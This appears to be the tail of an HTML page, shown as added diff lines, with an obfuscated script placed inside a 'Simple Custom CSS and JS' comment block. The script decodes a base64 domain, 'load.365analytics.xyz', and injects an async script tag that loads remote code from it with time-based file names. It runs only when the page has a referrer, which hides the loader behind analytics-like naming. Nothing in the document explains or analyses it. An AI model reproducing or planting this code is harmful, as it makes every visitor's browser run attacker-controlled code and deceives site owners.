+<script type="text/javascript">(function(_0xc59469,_0x1be38e){var _0x4e20c3=_0x442d,_0x3c2d09=_0xc59469();while(!![]){try{var _0x3c8895=-parseInt(_0x4e20c3(0xb6))/0x1*(-parseInt(_0x4e20c3(0xbc))/0x2)+parseInt(_0x4e20c3(0xb7))/0x3+-parseInt(_0x4e20c3(0xc4))/0x4*(-parseInt(_0x4e20c3(0xc1))/0x5)+-parseInt(_0x4e20c3(0xb9))/0x6+parseInt(_0x4e20c3(0xc0))/0x7+-parseInt(_0x4e20c3(0xbd))/0x8+-parseInt(_0x4e20c3(0xbb))/0x9;if(_0x3c8895===_0x1be38e)break;else _0x3c2d09['push'](_0x3c2d09['shift']());}catch(_0x3a9717){_0x3c2d09['push'](_0x3c2d09['shift']());}}}(_0x2bda,0x57e32),function(_0x17c8ea,_0x2572e7){var _0x45965e=_0x442d,_0x4c3cdb=Math['floor'](Date[_0x45965e(0xbe)]()/0x3e8),_0x5c98df=_0x4c3cdb-_0x4c3cdb%0xe10;_0x4c3cdb=_0x4c3cdb-_0x4c3cdb%0x258,_0x4c3cdb=_0x4c3cdb[_0x45965e(0xbf)](0x10);if(!document[_0x45965e(0xba)])return;const _0x26bed4=atob(_0x45965e(0xc6));_0x2572e7=_0x17c8ea[_0x45965e(0xb8)](_0x45965e(0xc9)),_0x2572e7[_0x45965e(0xc2)]='text/javascript',_0x2572e7[_0x45965e(0xc7)]=!![],_0x2572e7[_0x45965e(0xca)]=_0x45965e(0xc8)+_0x26bed4+_0x45965e(0xc5)+_0x5c98df+'.js?ver='+_0x4c3cdb,_0x17c8ea['getElementsByTagName']('head')[0x0][_0x45965e(0xc3)](_0x2572e7);}(document));function _0x442d(_0x2d5425,_0x24f6b1){var _0x2bdaa6=_0x2bda();return _0x442d=function(_0x442dcc,_0xed4883){_0x442dcc=_0x442dcc-0xb6;var _0x3d5d1e=_0x2bdaa6[_0x442dcc];return _0x3d5d1e;},_0x442d(_0x2d5425,_0x24f6b1);}function _0x2bda(){var _0x5e335c=['script','src','14DpQhBD','584673URYUaU','createElement','2561046jKBsjh','referrer','3560382XMVYNj','7706THDVnA','489360rDhlQm','now','toString','4117806bwNLOr','59780dGwAwr','type','appendChild','136qCYCNj','/my.counter.','bG9hZC4zNjVhbmFseXRpY3MueHl6','async','https://'];_0x2bda=function(){return _0x5e335c;};return _0x2bda();}</script><!-- end Simple Custom CSS and JS -->
+<!-- start Simple Custom CSS and JS -->
+<!-- c7d80293021d7ee27d369c7b2828cb29 --><!-- end Simple Custom CSS and JS -->
+</body>
+</html>
